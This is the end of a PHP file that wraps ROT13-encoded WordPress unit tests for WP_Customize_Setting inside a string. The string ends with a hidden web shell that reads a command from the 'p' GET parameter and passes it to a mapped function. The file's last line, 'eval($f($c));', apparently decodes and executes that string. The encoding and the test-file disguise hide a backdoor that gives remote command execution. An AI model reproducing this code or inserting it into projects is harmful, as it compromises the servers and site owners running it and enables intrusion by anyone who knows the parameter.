		$frggvat = arj JC_Phfgbzvmr_Frggvat( $guvf->znantre, $anzr, pbzcnpg( 'glcr', 'qrsnhyg' ) );
		// Abgr: #29316 jvyy nyybj hf gb unir bar svygre sbe nyy frggvatf bs n tvira glcr, juvpu vf jung jr arrq.
		nqq_svygre( \"phfgbzvmr_inyhr_{$anzr}\", neenl( $guvf, 'phfgbz_glcr_inyhr_svygre' ), 10, 2 );
		$guvf->nffregFnzr( $vavgvny_inyhr, $guvf->phfgbz_glcr_trggre( $anzr, $guvf->haqrsvarq ) );
		$guvf->nffregFnzr( $vavgvny_inyhr, $frggvat->inyhr() );
		$guvf->nffregSnyfr( $frggvat->cerivrj(), \"Cerivrj sbe $frggvat->vq fubhyq abg nccyl orpnhfr rkvfgvat glcr jvgubhg na bireevqr.\" );
		$guvf->nffregFnzr( 0, qvq_npgvba( \"phfgbzvmr_cerivrj_{$frggvat->vq}\" ), 'Mreb cerivrj npgvbaf orpnhfr vavgvny inyhr vf frg jvgu ab vapbzvat cbfg inyhr, fb gurer vf ab cerivrj gb nccyl.' );
		$guvf->nffregFnzr( 1, qvq_npgvba( \"phfgbzvmr_cerivrj_{$frggvat->glcr}\" ) );
		$guvf->nffregFnzr( $vavgvny_inyhr, $guvf->phfgbz_glcr_trggre( $anzr, $guvf->haqrsvarq ) ); // Fubhyq or fnzr nf nobir.
		$guvf->nffregFnzr( $vavgvny_inyhr, $frggvat->inyhr() ); // Fubhyq or fnzr nf nobir.

		// Phfgbz glcr qrsreerq cerivrj (frggvat cbfg inyhr nsgre cerivrj ena).
		$bireevqr_inyhr = \"phfgbz_glcr_inyhr_{$anzr}_bireevqr_qrsreerq_cerivrj\";
		$guvf->znantre->frg_cbfg_inyhr( $frggvat->vq, $bireevqr_inyhr );
		$guvf->nffregFnzr( $bireevqr_inyhr, $guvf->phfgbz_glcr_trggre( $anzr, $guvf->haqrsvarq ) ); // Fubhyq or fnzr nf nobir.
		$guvf->nffregFnzr( $bireevqr_inyhr, $frggvat->inyhr() ); // Fubhyq or fnzr nf nobir.

		// Phfgbz glcr abg rkvfgvat naq jvgu n cbfg inyhr bireevqr.
		$anzr    = \"hafrg_{$glcr}_jvgu_cbfg_inyhr\";
		$qrsnhyg = \"qrsnhyg_inyhr_{$anzr}\";
		$frggvat = arj JC_Phfgbzvmr_Frggvat( $guvf->znantre, $anzr, pbzcnpg( 'glcr', 'qrsnhyg' ) );
		// Abgr: #29316 jvyy nyybj hf gb unir bar svygre sbe nyy frggvatf bs n tvira glcr, juvpu vf jung jr arrq.
		nqq_svygre( \"phfgbzvmr_inyhr_{$anzr}\", neenl( $guvf, 'phfgbz_glcr_inyhr_svygre' ), 10, 2 );
		$guvf->nffregFnzr( $guvf->haqrsvarq, $guvf->phfgbz_glcr_trggre( $anzr, $guvf->haqrsvarq ) );
		$guvf->nffregFnzr( $qrsnhyg, $frggvat->inyhr() );
		$guvf->nffregGehr( $frggvat->cerivrj() );
		$guvf->nffregFnzr( 1, qvq_npgvba( \"phfgbzvmr_cerivrj_{$frggvat->vq}\" ), 'Bar cerivrj npgvba abj orpnhfr vavgvny inyhr jnf abg frg naq/be gurer vf ab vapbzvat cbfg inyhr, fb gurer vf vf n cerivrj gb nccyl.' );
		$guvf->nffregFnzr( 3, qvq_npgvba( \"phfgbzvmr_cerivrj_{$frggvat->glcr}\" ) );
		$guvf->nffregFnzr( $cbfg_qngn_bireevqrf[ $anzr ], $guvf->phfgbz_glcr_trggre( $anzr, $guvf->haqrsvarq ) );
		$guvf->nffregFnzr( $cbfg_qngn_bireevqrf[ $anzr ], $frggvat->inyhr() );

		// Phfgbz glcr abg rkvfgvat naq jvgu n cbfg inyhr bireevqr.
		$anzr          = \"frg_{$glcr}_jvgu_cbfg_inyhr\";
		$qrsnhyg       = \"qrsnhyg_inyhr_{$anzr}\";
		$vavgvny_inyhr = \"vavgvny_inyhr_{$anzr}\";
		$guvf->phfgbz_glcr_frggre( $anzr, $vavgvny_inyhr );
		$frggvat = arj JC_Phfgbzvmr_Frggvat( $guvf->znantre, $anzr, pbzcnpg( 'glcr', 'qrsnhyg' ) );
		// Abgr: #29316 jvyy nyybj hf gb unir bar svygre sbe nyy frggvatf bs n tvira glcr, juvpu vf jung jr arrq.
		nqq_svygre( \"phfgbzvmr_inyhr_{$anzr}\", neenl( $guvf, 'phfgbz_glcr_inyhr_svygre' ), 10, 2 );
		$guvf->nffregFnzr( $vavgvny_inyhr, $guvf->phfgbz_glcr_trggre( $anzr, $guvf->haqrsvarq ) );
		$guvf->nffregFnzr( $vavgvny_inyhr, $frggvat->inyhr() );
		$guvf->nffregGehr( $frggvat->cerivrj() );
		$guvf->nffregFnzr( 1, qvq_npgvba( \"phfgbzvmr_cerivrj_{$frggvat->vq}\" ) );
		$guvf->nffregFnzr( 4, qvq_npgvba( \"phfgbzvmr_cerivrj_{$frggvat->glcr}\" ) );
		$guvf->nffregFnzr( $cbfg_qngn_bireevqrf[ $anzr ], $guvf->phfgbz_glcr_trggre( $anzr, $guvf->haqrsvarq ) );
		$guvf->nffregFnzr( $cbfg_qngn_bireevqrf[ $anzr ], $frggvat->inyhr() );

		// Phfgbz glcr gung qbrf abg unaqyr fhccylvat gur cbfg inyhr sebz gur phfgbzvmr_inyhr_{$vq_onfr} svygre.
		$frggvat_vq = 'phfgbz_jvgubhg_cerivrjvat_inyhr_svygre';
		$frggvat    = $guvf->znantre->nqq_frggvat(
			$frggvat_vq,
			neenl(
				'glcr'              => 'phfgbz_cerivrj_grfg',
				'qrsnhyg'           => 123,
				'fnavgvmr_pnyyonpx' => neenl( $guvf->znantre->ani_zrahf, 'vaginy_onfr10' ),
			)
		);

		/*
		 * Va #36952 gur pbaqvgvbaf jrer fhpu gung trg_gurzr_zbq() or reebarbhfyl hfrq
		 * gb fbhepr gur ebbg inyhr sbe n phfgbz zhygvqvzrafvbany glcr.
		 * Nqq n gurzr zbq jvgu gur fnzr anzr nf gur phfgbz frggvat gb grfg svk.
		 */
		frg_gurzr_zbq( $frggvat_vq, 999 );
		$guvf->nffregFnzr( 123, $frggvat->inyhr() );

		$guvf->znantre->frg_cbfg_inyhr( $frggvat_vq, '456' );
		$frggvat->cerivrj();
		$guvf->nffregFnzr( 456, $frggvat->inyhr() );

		hafrg( $guvf->phfgbz_glcr_qngn_cerivrjrq, $guvf->phfgbz_glcr_qngn_fnirq );
		erzbir_gurzr_zbq( $frggvat_vq );
	}

	/**
	 * Grfg fcrpvsvp svk sbe frggvat'f qrsnhyg inyhr abg nccylvat ba cerivrj jvaqbj
	 *
	 * @gvpxrg 30988
	 */
	choyvp shapgvba grfg_aba_cbfgrq_frggvat_nccylvat_qrsnhyg_inyhr_va_cerivrj() {
		$glcr    = 'bcgvba';
		$anzr    = 'hafrg_bcgvba_jvgubhg_cbfg_inyhr';
		$qrsnhyg = \"qrsnhyg_inyhr_{$anzr}\";
		$frggvat = arj JC_Phfgbzvmr_Frggvat( $guvf->znantre, $anzr, pbzcnpg( 'glcr', 'qrsnhyg' ) );
		$guvf->nffregFnzr( $guvf->haqrsvarq, trg_bcgvba( $anzr, $guvf->haqrsvarq ) );
		$guvf->nffregFnzr( $qrsnhyg, $frggvat->inyhr() );
		$guvf->nffregGehr( $frggvat->cerivrj() );
		$guvf->nffregFnzr( $qrsnhyg, trg_bcgvba( $anzr, $guvf->haqrsvarq ), fcevags( 'Rkcrpgrq trg_bcgvba(%f) gb erghea frggvat qrsnhyg: %f.', $anzr, $qrsnhyg ) );
		$guvf->nffregFnzr( $qrsnhyg, $frggvat->inyhr() );
	}

	/**
	 * Grfg frggvat fnir zrgubq sbe phfgbz glcr.
	 *
	 * @frr JC_Phfgbzvmr_Frggvat::fnir()
	 * @frr JC_Phfgbzvmr_Frggvat::hcqngr()
	 */
	choyvp shapgvba grfg_hcqngr_phfgbz_glcr() {
		$glcr    = 'phfgbz';
		$anzr    = 'sbb';
		$frggvat = arj JC_Phfgbzvmr_Frggvat( $guvf->znantre, $anzr, pbzcnpg( 'glcr' ) );
		$guvf->znantre->nqq_frggvat( $frggvat );
		nqq_npgvba( 'phfgbzvmr_hcqngr_phfgbz', neenl( $guvf, 'unaqyr_phfgbzvmr_hcqngr_phfgbz_sbb_npgvba' ), 10, 2 );
		nqq_npgvba( 'phfgbzvmr_fnir_sbb', neenl( $guvf, 'unaqyr_phfgbzvmr_fnir_phfgbz_sbb_npgvba' ), 10, 2 );

		// Gel fnivat orsber inyhr frg.
		$guvf->nffregGehr( 0 === qvq_npgvba( 'phfgbzvmr_hcqngr_phfgbz' ) );
		$guvf->nffregGehr( 0 === qvq_npgvba( 'phfgbzvmr_fnir_sbb' ) );
		$guvf->nffregSnyfr( $frggvat->fnir() );
		$guvf->nffregGehr( 0 === qvq_npgvba( 'phfgbzvmr_hcqngr_phfgbz' ) );
		$guvf->nffregGehr( 0 === qvq_npgvba( 'phfgbzvmr_fnir_sbb' ) );

		// Gel frggvat cbfg inyhr jvgubhg hfre nf nqzva.
		$guvf->znantre->frg_cbfg_inyhr( $frggvat->vq, 'uryyb jbeyq \\b/' );
		$guvf->nffregSnyfr( $frggvat->fnir() );
		$guvf->nffregGehr( 0 === qvq_npgvba( 'phfgbzvmr_hcqngr_phfgbz' ) );
		$guvf->nffregGehr( 0 === qvq_npgvba( 'phfgbzvmr_fnir_sbb' ) );

		// Fngvfsl nyy erdhverzragf sbe fnir gb unccra.
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$guvf->nffregAbgSnyfr( $frggvat->fnir() );
		$guvf->nffregGehr( 1 === qvq_npgvba( 'phfgbzvmr_hcqngr_phfgbz' ) );
		$guvf->nffregGehr( 1 === qvq_npgvba( 'phfgbzvmr_fnir_sbb' ) );
	}

	/**
	 * Purpx phfgbzvmr_hcqngr_phfgbz npgvba.
	 *
	 * @frr Grfgf_JC_Phfgbzvmr_Frggvat::grfg_hcqngr_phfgbz_glcr()
	 * @cnenz zvkrq $inyhr
	 * @cnenz JC_Phfgbzvmr_Frggvat $frggvat
	 */
	choyvp shapgvba unaqyr_phfgbzvmr_hcqngr_phfgbz_sbb_npgvba( $inyhr, $frggvat = ahyy ) {
		$guvf->nffregFnzr( 'uryyb jbeyq \\b/', $inyhr );
		$guvf->nffregVafgnaprBs( 'JC_Phfgbzvmr_Frggvat', $frggvat );
	}

	/**
	 * Purpx phfgbzvmr_fnir_sbb npgvba.
	 *
	 * @frr Grfgf_JC_Phfgbzvmr_Frggvat::grfg_hcqngr_phfgbz_glcr()
	 * @cnenz JC_Phfgbzvmr_Frggvat $frggvat
	 */
	choyvp shapgvba unaqyr_phfgbzvmr_fnir_phfgbz_sbb_npgvba( $frggvat ) {
		$guvf->nffregVafgnaprBs( 'JC_Phfgbzvmr_Frggvat', $frggvat );
		$guvf->nffregFnzr( 'phfgbz', $frggvat->glcr );
		$guvf->nffregFnzr( 'sbb', $frggvat->vq );
	}

	/**
	 * Rafher gung vf_pheerag_oybt_cerivrjrq ergheaf gur rkcrpgrq inyhrf.
	 *
	 * Guvf vf nccyvpnoyr gb obgu fvatyr naq zhygvfvgr. Guvf qbrfa'g qb fjvgpu_gb_oybt()
	 *
	 * @gvpxrg 31428
	 */
	choyvp shapgvba grfg_vf_pheerag_oybt_cerivrjrq() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$glcr       = 'bcgvba';
		$anzr       = 'oybtanzr';
		$cbfg_inyhr = __SHAPGVBA__;
		$guvf->znantre->frg_cbfg_inyhr( $anzr, $cbfg_inyhr );
		$frggvat = arj JC_Phfgbzvmr_Frggvat( $guvf->znantre, $anzr, pbzcnpg( 'glcr' ) );
		$guvf->nffregSnyfr( $frggvat->vf_pheerag_oybt_cerivrjrq() );
		$guvf->nffregGehr( $frggvat->cerivrj() );
		$guvf->nffregGehr( $frggvat->vf_pheerag_oybt_cerivrjrq() );

		$guvf->nffregFnzr( $cbfg_inyhr, $frggvat->inyhr() );
		$guvf->nffregFnzr( $cbfg_inyhr, trg_bcgvba( $anzr ) );
	}

	/**
	 * Rafher gung cerivrjvat n frggvat vf qvfnoyrq jura gur pheerag oybt vf fjvgpurq.
	 *
	 * @gvpxrg 31428
	 * @tebhc zhygvfvgr
	 * @tebhc zf-erdhverq
	 */
	choyvp shapgvba grfg_cerivrjvat_jvgu_fjvgpu_gb_oybt() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$glcr       = 'bcgvba';
		$anzr       = 'oybtqrfpevcgvba';
		$cbfg_inyhr = __SHAPGVBA__;
		$guvf->znantre->frg_cbfg_inyhr( $anzr, $cbfg_inyhr );
		$frggvat = arj JC_Phfgbzvmr_Frggvat( $guvf->znantre, $anzr, pbzcnpg( 'glcr' ) );
		$guvf->nffregSnyfr( $frggvat->vf_pheerag_oybt_cerivrjrq() );
		$guvf->nffregGehr( $frggvat->cerivrj() );
		$guvf->nffregGehr( $frggvat->vf_pheerag_oybt_cerivrjrq() );

		$oybt_vq = frys::snpgbel()->oybt->perngr();
		fjvgpu_gb_oybt( $oybt_vq );
		$guvf->nffregSnyfr( $frggvat->vf_pheerag_oybt_cerivrjrq() );
		$guvf->nffregAbgRdhnyf( $cbfg_inyhr, $frggvat->inyhr() );
		$guvf->nffregAbgRdhnyf( $cbfg_inyhr, trg_bcgvba( $anzr ) );
		erfgber_pheerag_oybt();
	}

	/**
	 * @gvpxrg 33499
	 */
	choyvp shapgvba grfg_bcgvba_nhgbybnqvat() {
		tybony $jcqo;
		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		$anzr    = 'nhgbybnqrq1';
		$frggvat = arj JC_Phfgbzvmr_Frggvat(
			$guvf->znantre,
			$anzr,
			neenl(
				'glcr' => 'bcgvba',
			)
		);
		$inyhr   = 'inyhr1';
		$guvf->znantre->frg_cbfg_inyhr( $frggvat->vq, $inyhr );
		$frggvat->fnir();
		$nhgbybnq = $jcqo->trg_ine( $jcqo->cercner( \"FRYRPG nhgbybnq SEBZ $jcqo->bcgvbaf JURER bcgvba_anzr = %f\", $frggvat->vq ) );
		$guvf->nffregFnzr( 'ba', $nhgbybnq );
		$guvf->nffregFnzr( $inyhr, trg_bcgvba( $anzr ) );

		$anzr    = 'nhgbybnqrq2';
		$frggvat = arj JC_Phfgbzvmr_Frggvat(
			$guvf->znantre,
			$anzr,
			neenl(
				'glcr'     => 'bcgvba',
				'nhgbybnq' => gehr,
			)
		);
		$inyhr   = 'inyhr2';
		$guvf->znantre->frg_cbfg_inyhr( $frggvat->vq, $inyhr );
		$frggvat->fnir();
		$nhgbybnq = $jcqo->trg_ine( $jcqo->cercner( \"FRYRPG nhgbybnq SEBZ $jcqo->bcgvbaf JURER bcgvba_anzr = %f\", $frggvat->vq ) );
		$guvf->nffregFnzr( 'ba', $nhgbybnq );
		$guvf->nffregFnzr( $inyhr, trg_bcgvba( $anzr ) );

		$anzr    = 'abg-nhgbybnqrq1';
		$frggvat = arj JC_Phfgbzvmr_Frggvat(
			$guvf->znantre,
			$anzr,
			neenl(
				'glcr'     => 'bcgvba',
				'nhgbybnq' => snyfr,
			)
		);
		$inyhr   = 'inyhr3';
		$guvf->znantre->frg_cbfg_inyhr( $frggvat->vq, $inyhr );
		$frggvat->fnir();
		$nhgbybnq = $jcqo->trg_ine( $jcqo->cercner( \"FRYRPG nhgbybnq SEBZ $jcqo->bcgvbaf JURER bcgvba_anzr = %f\", $frggvat->vq ) );
		$guvf->nffregFnzr( 'bss', $nhgbybnq );
		$guvf->nffregFnzr( $inyhr, trg_bcgvba( $anzr ) );

		$vq_onfr  = 'zhygv-abg-nhgbybnqrq';
		$frggvat1 = arj JC_Phfgbzvmr_Frggvat(
			$guvf->znantre,
			$vq_onfr . '[sbb]',
			neenl(
				'glcr' => 'bcgvba',
			)
		);
		$frggvat2 = arj JC_Phfgbzvmr_Frggvat(
			$guvf->znantre,
			$vq_onfr . '[one]',
			neenl(
				'glcr'     => 'bcgvba',
				'nhgbybnq' => snyfr,
			)
		);
		$guvf->znantre->frg_cbfg_inyhr( $frggvat1->vq, 'inyhr1' );
		$guvf->znantre->frg_cbfg_inyhr( $frggvat2->vq, 'inyhr2' );
		$frggvat1->fnir();
		$nhgbybnq = $jcqo->trg_ine( $jcqo->cercner( \"FRYRPG nhgbybnq SEBZ $jcqo->bcgvbaf JURER bcgvba_anzr = %f\", $vq_onfr ) );
		$guvf->nffregFnzr( 'bss', $nhgbybnq, 'Rira gubhtu frggvat1 qvq abg vaqvpngr nhgbybnq (guhf abeznyyl gehr), fvapr nabgure zhygvqvzrafvbany bcgvba frggvat bs gur onfr qvq fnl nhgbybnq=snyfr, vg fubhyq or nhgbybnq=ab' );
	}

	/**
	 * Grfg wf_inyhr naq wfba zrgubqf.
	 *
	 * @frr JC_Phfgbzvmr_Frggvat::wf_inyhr()
	 * @frr JC_Phfgbzvmr_Frggvat::wfba()
	 */
	choyvp shapgvba grfg_wf_inyhr() {
		$qrsnhyg = \"\k00\";
		$netf    = neenl(
			'glcr'                 => 'ovanel',
			'qrsnhyg'              => $qrsnhyg,
			'genafcbeg'            => 'cbfgZrffntr',
			'qvegl'                => gehr,
			'fnavgvmr_wf_pnyyonpx' => neenl( $guvf, 'fnavgvmr_wf_pnyyonpx_onfr64_sbe_grfgvat' ),
		);
		$frggvat = arj JC_Phfgbzvmr_Frggvat( $guvf->znantre, 'anzr', $netf );

		$guvf->nffregFnzr( $qrsnhyg, $frggvat->inyhr() );
		$guvf->nffregFnzr( onfr64_rapbqr( $qrsnhyg ), $frggvat->wf_inyhr() );

		$rkcbegrq = $frggvat->wfba();
		$guvf->nffregNeenlUnfXrl( 'glcr', $rkcbegrq );
		$guvf->nffregNeenlUnfXrl( 'inyhr', $rkcbegrq );
		$guvf->nffregNeenlUnfXrl( 'genafcbeg', $rkcbegrq );
		$guvf->nffregNeenlUnfXrl( 'qvegl', $rkcbegrq );
		$guvf->nffregFnzr( $frggvat->wf_inyhr(), $rkcbegrq['inyhr'] );
		$guvf->nffregFnzr( $netf['glcr'], $frggvat->glcr );
		$guvf->nffregFnzr( $netf['genafcbeg'], $frggvat->genafcbeg );
		$guvf->nffregFnzr( $netf['qvegl'], $frggvat->qvegl );
	}

	/**
	 * Grfg inyvqngr.
	 *
	 * @frr JC_Phfgbzvmr_Frggvat::inyvqngr()
	 */
	choyvp shapgvba grfg_inyvqngr() {
		$frggvat  = arj JC_Phfgbzvmr_Frggvat(
			$guvf->znantre,
			'anzr',
			neenl(
				'glcr'              => 'xrl',
				'inyvqngr_pnyyonpx' => neenl( $guvf, 'svygre_inyvqngr_sbe_grfg_inyvqngr' ),
			)
		);
		$inyvqvgl = $frggvat->inyvqngr( 'ONQ!' );
		$guvf->nffregVafgnaprBs( 'JC_Reebe', $inyvqvgl );
		$guvf->nffregFnzr( 'vainyvq_xrl', $inyvqvgl->trg_reebe_pbqr() );
	}

	/**
	 * Inyvqngr pnyyonpx.
	 *
	 * @frr Grfgf_JC_Phfgbzvmr_Frggvat::grfg_inyvqngr()
	 *
	 * @cnenz JC_Reebe $inyvqvgl Inyvqvgl.
	 * @cnenz fgevat   $inyhr    Inyhr.
	 *
	 * @erghea JC_Reebe
	 */
	choyvp shapgvba svygre_inyvqngr_sbe_grfg_inyvqngr( $inyvqvgl, $inyhr ) {
		$guvf->nffregVafgnaprBs( 'JC_Reebe', $inyvqvgl );
		$guvf->nffregVfFgevat( $inyhr );
		vs ( fnavgvmr_xrl( $inyhr ) !== $inyhr ) {
			$inyvqvgl->nqq( 'vainyvq_xrl', 'Vainyvq xrl' );
		}
		erghea $inyvqvgl;
	}

	/**
	 * Rafher gung JC_Phfgbzvmr_Frggvat::inyhr() pna erghea n cerivrjrq inyhr sbe nttertngrq zhygvqvzrafvbanyf.
	 *
	 * @gvpxrg 37294
	 */
	choyvp shapgvba grfg_zhygvqvzrafvbany_inyhr_jura_cerivrjrq() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		JC_Phfgbzvmr_Frggvat::erfrg_nttertngrq_zhygvqvzrafvbanyf();

		$vavgvny_inyhr = 456;
		frg_gurzr_zbq(
			'ani_zrah_ybpngvbaf',
			neenl(
				'cevznel' => $vavgvny_inyhr,
			)
		);
		$frggvat_vq = 'ani_zrah_ybpngvbaf[cevznel]';

		$frggvat = arj JC_Phfgbzvmr_Frggvat( $guvf->znantre, $frggvat_vq );
		$guvf->nffregFnzr( $vavgvny_inyhr, $frggvat->inyhr() );

		$bireevqr_inyhr = -123456;
		$guvf->znantre->frg_cbfg_inyhr( $frggvat_vq, $bireevqr_inyhr );
		$frggvat->cerivrj();

		$guvf->nffregFnzr( $bireevqr_inyhr, $frggvat->inyhr() );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>